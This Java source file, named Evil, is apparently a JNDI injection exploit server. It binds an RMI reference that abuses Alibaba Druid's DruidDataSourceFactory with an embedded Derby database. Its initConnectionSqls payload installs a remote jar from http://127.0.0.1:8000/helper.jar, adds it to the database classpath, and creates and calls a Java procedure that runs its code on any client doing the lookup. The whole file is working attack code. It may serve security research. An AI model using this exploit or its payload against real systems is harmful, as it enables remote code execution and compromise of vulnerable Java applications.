package org;


import com.sun.jndi.rmi.registry.ReferenceWrapper;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * @author by RacerZ
 * @date 2024/2/13.
 */
public class Evil {
    public static void main(String[] args) {
        try{
            Registry registry = LocateRegistry.createRegistry(8883);
            Reference ref = new Reference("javax.sql.DataSource","com.alibaba.druid.pool.DruidDataSourceFactory",null);
            String JDBC_URL = "jdbc:derby:webdb;create=true";
            String JDBC_USER = "root";
            String JDBC_PASSWORD = "password";
            String PAYLOAD = "CALL SQLJ.INSTALL_JAR('http://127.0.0.1:8000/helper.jar', 'APP.Sample4', 0);CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','APP.Sample4');CREATE PROCEDURE SALES.TOTAL_REVENUES2() PARAMETER STYLE JAVA READS SQL DATA LANGUAGE JAVA EXTERNAL NAME 'App.exec';CALL SALES.TOTAL_REVENUES2();";

            ref.add(new StringRefAddr("driverClassName","org.apache.derby.jdbc.EmbeddedDriver"));
            ref.add(new StringRefAddr("url",JDBC_URL));
            ref.add(new StringRefAddr("username",JDBC_USER));
            ref.add(new StringRefAddr("password",JDBC_PASSWORD));
            ref.add(new StringRefAddr("initConnectionSqls", PAYLOAD));
            ref.add(new StringRefAddr("initialSize","1"));
            ref.add(new StringRefAddr("init","true"));
            ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);

            Naming.bind("rmi://127.0.0.1:8883/aa", referenceWrapper);
        }
        catch(Exception e){
            e.printStackTrace();
        }
    }
}
